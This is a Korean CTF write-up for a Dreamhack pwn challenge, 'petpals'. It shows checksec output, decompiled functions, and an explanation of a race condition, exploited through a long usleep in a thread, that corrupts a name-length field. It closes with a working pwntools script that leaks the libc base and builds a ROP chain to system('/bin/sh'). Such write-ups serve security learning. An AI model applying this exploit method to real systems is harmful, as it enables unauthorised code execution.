```bash
root@98b96d1d567d:/home/petpals# checksec petpals
[*] '/home/petpals/petpals'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

카나리가 없다.

함수는 꽤 많은데 하나하나보면 간단하다.

```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+Ch] [rbp-44h] BYREF
  unsigned int v5[16]; // [rsp+10h] [rbp-40h] BYREF

  v5[0] = 4;
  init();
  do
  {
    print_menu();
    __isoc99_scanf("%d", &v4);
    if ( v4 == 3 )
    {
      rename_via((__int64)v5);
    }
    else
    {
      if ( v4 > 3 )
        goto dont_act;
      if ( v4 == 1 )
      {
        create_update(v5);
        continue;
      }
      if ( v4 == 2 )
        walk(v5);
      else
dont_act:
        printf("\n> ");
    }
  }
  while ( v4 != 4 );
  return 0LL;
}
```

동물 정보가 스택에서 관리된다.

```C
__int64 __fastcall set_read_size(__int64 a1)
{
  unsigned int v1; // eax
  __int64 result; // rax

  v1 = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 == 3 )
  {
    result = a1;
    *(_QWORD *)(a1 + 24) = 16LL;
  }
  else
  {
    if ( v1 > 3 )
      goto err2;
    if ( v1 != 2 )
    {
      if ( v1 <= 2 )
      {
        result = a1;
        *(_QWORD *)(a1 + 40) = 32LL;
        return result;
      }
err2:
      exit(1);
    }
    result = a1;
    *(_QWORD *)(a1 + 24) = 16LL;
  }
  return result;
}
```

동물별로 입력받는 이름의 크기가 다르다.

```C
void *__fastcall start_routine(unsigned int *a1)
{
  const char *v1; // rbx
  unsigned int *v2; // rax
  const char *v3; // rbx
  unsigned int *v4; // rax
  char dest[56]; // [rsp+10h] [rbp-50h] BYREF
  void *src; // [rsp+48h] [rbp-18h]

  src = a1;
  v1 = (const char *)*(&off_4040 + *a1);
  v2 = ret_name(a1);
  printf("sent %s for a walk.. %s\n", (const char *)v2, v1);
  memcpy(dest, a1, sizeof(dest));
  usleep(0x3D0900u);
  cp((__int64)src, (__int64)dest);
  v3 = (const char *)*(&off_4040 + *(unsigned int *)src);
  v4 = ret_name((unsigned int *)src);
  printf("%s is returned from the walk and is satisfied! %s\n", (const char *)v4, v3);
  return 0LL;
}
```

usleep이 엄청 길어서 레이스 컨디션이 가능하다. 32 크기를 가진 동물을 쓰레드에 넣어놓고 16크기를 가진 동물로 바꿔놓으면 size 조작이 가능하다.

walk에서 memory leak이 가능하므로 libc base를 구할 수 있다. 그 후엔 ROP

```python
from pwn import *

p = remote('host3.dreamhack.games', 18156)
l = ELF('./libc.so.6')

context.log_level = 'debug'

def create(animal: str, name: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'animal type: ', animal.encode())
    p.sendafter(b'name: ', name)

def walk():
    p.sendlineafter(b'> ', b'2')

def rename(name: bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b'name: ', name)

create('hamster', b'a')
walk()
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'animal type: ', b'cat')
p.recvuntil(b'satisfied!')
p.send(b'a' * 0x10 + p64(0x1000))

rename(b'a' * 0x40)
walk()
p.recvuntil(b'a' * 0x40)
l.address = u64(p.recvn(6).ljust(8, b'\x00')) - (0x7ffff7db8d90 - 0x7ffff7d8f000)
print(hex(l.address))

p.sendline(b'1')
p.sendlineafter(b'animal type: ', b'cat')
p.recvuntil(b'satisfied!')
p.send(b'a' * 0x10 + p64(0x1000))

ret = l.address + 0x0000000000029139
pop_rdi = l.address + 0x000000000002a3e5
binsh = list(l.search(b'/bin/sh'))[0]
system = l.sym['system']

print(hex(ret))
print(hex(pop_rdi))
print(hex(binsh))
print(hex(system))

rename(b'a' * 0x40 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system))
p.sendlineafter(b'> ', b'4')

p.interactive()
```